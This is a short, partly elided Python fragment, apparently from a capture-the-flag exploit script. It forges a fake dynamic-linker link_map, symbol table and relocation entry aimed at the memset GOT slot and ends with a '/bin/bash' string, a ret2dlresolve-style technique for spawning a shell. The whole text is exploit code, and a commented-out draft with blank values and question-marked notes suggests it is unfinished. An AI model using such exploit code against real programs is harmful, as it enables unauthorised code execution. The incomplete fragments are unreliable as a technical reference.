...
def make_link_map(fake_addr, reloc_index, offset_2_addr, got_start_addr):
    ...
    fake_jmprel = p32(exe.got.memset)  + p32(0x7) # Rinfo
    fake_symtab = p32(6) + p32(got_start_addr -8) + p32(0) + p32(0x0300)
    ...
    fake_link_map += p32(fake_addr) 

    fake_link_map += p32(fake_addr + 128) 
    fake_link_map = fake_link_map.ljust(128 -4, b'\x00') 

    # Pointer to jmprel
    fake_link_map += p32(fake_addr + 0x7c + 4 + len(fake_symtab)) 



    # fake = flat([ 
    #     {0: offset_2_addr }, # lm->l_addr
    #     {4: 17}, # jmprel tag 17
    #     {8: fake_addr + 12}, # jmprel pointer 
    #     {12: }, # jmprel p_r_offset 
    #     {16: }, # jmprel r_info 
    #     {20: }, # jmprel r_offset  ^^ Swap these????
    #     {24: 6}, # symtab   name, tag ??
    #     {28: got_start_addr-8}, # symtab st_value 
    #     ])

    return fake_link_map + fake_symtab + fake_jmprel + b'/bin/bash'
